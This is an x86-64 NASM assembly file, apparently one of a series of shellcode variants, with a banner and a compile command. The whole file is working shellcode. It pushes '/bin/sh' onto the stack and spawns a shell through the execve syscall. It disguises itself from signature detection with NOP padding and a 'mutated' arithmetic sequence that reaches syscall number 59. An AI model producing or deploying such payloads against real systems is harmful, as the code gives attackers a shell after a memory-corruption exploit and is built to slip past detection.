;
;      ooo           ***           ...           ...           ...
;     (o o)         (o o)         (- -)         (. .)         (* *)
; ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-ooO--(_)--Ooo-
;
; Same asm code as others, but no custom elf header.
;
; Compile with:
; nasm -f elf64 -o shellexec-example-large -s shellexec-example-large.asm

_start:
    mov rax, 0x68732f6e69622f 	; mov  value "/bin/sh" in hex to rax
    push rax
    push rsp
    nop				; No operation, Actually do nothing.
    nop				; No operation, Actually do nothing.
    nop				; No operation, Actually do nothing.
    pop rdi
    and eax, 0			; Random way to make eax equal 0
    push rax
    mov al, 106			; Mutate function, start with random value
    add al, 77			; add random value
    sub al, 124			; make sure al has value 59 for exec syscall
    push rsp
    pop rdx
    push rsp
    pop rsi
    syscall 			; calling function 59, exec
